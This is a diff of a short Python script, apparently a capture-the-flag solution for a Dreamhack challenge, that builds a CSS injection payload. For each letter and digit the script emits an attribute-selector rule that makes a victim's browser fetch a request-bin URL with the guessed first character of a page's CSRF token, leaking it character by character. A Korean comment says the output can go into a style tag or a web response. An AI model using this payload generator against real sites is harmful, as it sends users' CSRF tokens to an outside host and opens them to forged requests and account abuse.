@@ -1,16 +1,9 @@
-.csrf {
-  display: block !important;
-  width: 1px;
-  height: 1px;
-  opacity: 0;
-  position: absolute;
-}
 
 CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-BIN_URL = "https://brcgtxx.request.dreamhack.games"
+BIN_URL = "https://apbycad.request.dreamhack.games"
 
 css_payload = ""
 for c in CHARS:
-    css_payload += f'input[name="csrf"][value^="{c}"] {{ background: url("{BIN_URL}?q={c}"); }}\n'
+    css_payload += f'input[name="csrf"][value^="{c}"] + input {{ background: url("{BIN_URL}?q={c}"); }}\n'
 
 print(css_payload)  # 출력해서 HTML <style> 태그 안에 넣거나 웹 응답으로 사용 가능
